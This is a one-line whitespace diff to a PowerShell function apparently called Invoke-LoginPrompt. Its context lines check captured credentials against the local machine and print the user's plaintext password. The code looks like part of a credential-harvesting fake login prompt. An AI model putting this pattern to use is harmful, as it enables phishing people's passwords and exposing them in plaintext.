@@ -15,7 +15,7 @@ function Invoke-LoginPrompt{
         Add-Type -assemblyname System.DirectoryServices.AccountManagement
         $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
         $DS.ValidateCredentials("$full", "$password") | out-null
-        }
+    }
      
      $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
      $output
